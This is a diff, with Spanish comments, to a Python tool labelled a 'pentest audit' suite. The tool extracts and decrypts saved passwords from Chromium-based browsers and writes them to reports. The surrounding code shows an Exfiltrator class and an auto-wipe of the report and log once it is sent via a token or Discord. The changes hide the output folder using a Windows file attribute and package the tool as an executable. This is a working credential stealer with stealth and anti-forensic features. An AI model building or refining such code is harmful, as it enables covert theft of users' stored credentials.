@@ -6,6 +6,7 @@ import base64
 import sqlite3
 import shutil
 import csv
+import ctypes
 import logging
 import argparse
 import requests
@@ -44,11 +45,23 @@ except ImportError:
 
 from Cryptodome.Cipher import AES
 
-# PID calculado una vez al inicio para nombrar archivos temporales únicos
-_PID = os.getpid()
+# ── Directorio de salida oculto (.audit/) junto al script o ejecutable ──────
+def _get_base_dir() -> Path:
+    """Devuelve el directorio del ejecutable/script, compatible con PyInstaller."""
+    if getattr(sys, 'frozen', False):
+        return Path(sys.executable).parent
+    return Path(__file__).parent
 
-# Logging: FileHandler siempre activo; StreamHandler solo si hay consola disponible
-LOG_FILE  = "pentest_audit.log"
+OUTPUT_DIR = _get_base_dir() / ".audit"
+OUTPUT_DIR.mkdir(exist_ok=True)
+# Marcar como carpeta oculta en Windows (atributo FILE_ATTRIBUTE_HIDDEN = 0x2)
+ctypes.windll.kernel32.SetFileAttributesW(str(OUTPUT_DIR), 0x2)
+
+# PID calculado una vez al inicio para nombrar archivos temporales únicos
+_PID     = os.getpid()
+LOG_FILE = OUTPUT_DIR / "pentest_audit.log"
+
+# Logging: FileHandler en .audit/; StreamHandler solo si hay consola disponible
 _handlers = [logging.FileHandler(LOG_FILE, encoding='utf-8')]
 try:
     sys.stdout.fileno()
@@ -85,6 +98,7 @@ HTML_TEMPLATE = """
         .brave { background-color: #ff5722; color: white; }
         .opera { background-color: #f44336; color: white; }
         .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
+        .skipped { color: #aaa; font-style: italic; }
     </style>
 </head>
 <body>
@@ -105,13 +119,19 @@ HTML_TEMPLATE = """
                 {{rows}}
             </tbody>
         </table>
-        <div class="footer">Suite de Auditoría Profesional - Uso bajo responsabilidad ética</div>
+        <div class="footer">
+            Suite de Auditoría Profesional - Uso bajo responsabilidad ética
+            <span class="skipped">{{skipped_note}}</span>
+        </div>
     </div>
 </body>
 </html>
 """
 
 REQUEST_TIMEOUT = 10  # segundos máximos de espera por petición de red
+
+# Solo se indexan entradas con URL de login real (http/https)
+VALID_URL_PREFIXES = ('http://', 'https://')
 
 
 class Exfiltrator:
@@ -199,7 +219,9 @@ class ChromiumDecryptor:
             return "[Error al descifrar]"
 
     def audit(self, fmt="html", out="audit_report"):
-        data = []
+        data    = []
+        skipped = 0  # entradas con URL no-http (javascript:, chrome://, etc.)
+
         for name, path in self.browsers.items():
             if not path.exists():
                 continue
@@ -219,7 +241,7 @@ class ChromiumDecryptor:
                 db = p / "Login Data"
                 if not db.exists():
                     continue
-                tmp  = Path(f"tmp_audit_{_PID}.db")
+                tmp  = OUTPUT_DIR / f"tmp_audit_{_PID}.db"
                 conn = None
                 try:
                     shutil.copy2(db, tmp)
@@ -227,8 +249,13 @@ class ChromiumDecryptor:
                     cursor = conn.cursor()
                     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                     for row in cursor.fetchall():
-                        if row[0] and row[1] and row[2]:
-                            data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
+                        if not (row[0] and row[1] and row[2]):
+                            continue
+                        if not row[0].startswith(VALID_URL_PREFIXES):
+                            # Filtrar artefactos de frameworks (javascript:, chrome://, etc.)
+                            skipped += 1
+                            continue
+                        data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
                     cursor.close()
                 except Exception as e:
                     logger.warning(f"Error leyendo {name}/{p.name}: {e}")
@@ -237,16 +264,24 @@ class ChromiumDecryptor:
                         conn.close()
                     tmp.unlink(missing_ok=True)
 
+        if skipped:
+            logger.info(f"{skipped} entradas descartadas (URLs no-http: javascript:, chrome://, etc.)")
+
         if not data:
             logger.info("No se encontraron credenciales.")
             return 0, None
 
         # Si el archivo ya existe, añade timestamp para preservar auditorías anteriores
-        base_out  = f"{out}.{fmt}"
         stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
-        final_out = f"{out}_{stamp}.{fmt}" if Path(base_out).exists() else base_out
-        if final_out != base_out:
-            logger.info(f"Archivo existente detectado. Guardando como: {final_out}")
+        base_name = f"{out}.{fmt}"
+        base_out  = OUTPUT_DIR / base_name
+        if base_out.exists():
+            final_out = OUTPUT_DIR / f"{out}_{stamp}.{fmt}"
+            logger.info(f"Archivo existente detectado. Guardando como: {final_out.name}")
+        else:
+            final_out = base_out
+
+        skipped_note = f" · {skipped} entradas no-http descartadas" if skipped else ""
 
         if fmt == "csv":
             with open(final_out, 'w', newline='', encoding='utf-8') as f:
@@ -263,11 +298,12 @@ class ChromiumDecryptor:
                     f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
                     f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
                 )
-            # Orden: total y date primero para que user data no pueda colisionar con esos marcadores
+            # total y date se reemplazan antes que rows para evitar colisión con datos de usuario
             html_out = (HTML_TEMPLATE
                         .replace("{{total}}", str(len(data)))
                         .replace("{{date}}", stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
                                  + " " + stamp[9:11] + ":" + stamp[11:13])
+                        .replace("{{skipped_note}}", skipped_note)
                         .replace("{{rows}}", rows_html))
             with open(final_out, "w", encoding='utf-8') as f:
                 f.write(html_out)
@@ -329,7 +365,7 @@ def main():
         if not args.no_wipe and (token or discord):
             Path(final_file).unlink(missing_ok=True)
             _close_log_handler()  # cerrar FileHandler ANTES de borrar el .log
-            Path(LOG_FILE).unlink(missing_ok=True)
+            LOG_FILE.unlink(missing_ok=True)
             print("[+] Auto-Wipe completado: reporte y log eliminados.")
 
 
